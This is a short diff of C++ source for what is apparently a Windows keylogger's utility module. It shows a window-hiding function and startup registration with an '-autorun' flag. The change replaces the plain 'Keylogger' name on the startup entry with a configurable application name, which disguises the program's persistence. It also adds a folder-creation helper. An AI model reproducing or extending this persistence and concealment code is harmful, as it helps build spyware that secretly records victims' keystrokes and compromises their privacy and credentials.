@@ -1,10 +1,10 @@
 #include "stdafx.h"
 
 #include "Utility.h"
+
 #include <fstream>
 #include <vector>
 #include <string>
-
 #include <iostream>
 
 void utility::hide_window()
@@ -107,7 +107,8 @@ void utility::RegisterProgram()
 	wchar_t szPathToExe[MAX_PATH];
 
 	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
-	RegisterMyProgramForStartup(L"Keylogger", szPathToExe, L"-autorun");
+	//RegisterMyProgramForStartup(L"Keylogger", szPathToExe, L"-autorun");
+	RegisterMyProgramForStartup(configuration::application_name.c_str(), szPathToExe, L"-autorun");
 }
 
 std::string utility::get_application_path()
@@ -122,6 +123,14 @@ std::string utility::get_application_path()
 	//std::wcout << "Executable started from: " << selfpath_wchar << std::endl;
 
 	return std::string(selfpath);
+}
+
+void utility::create_folder(const wchar_t * path)
+{
+	if (CreateDirectory(path, NULL) == false)
+	{
+		std::cout << "Couldn't create a directory!\n";
+	}
 }
 
 bool utility::file_exists(const std::string &file_name)
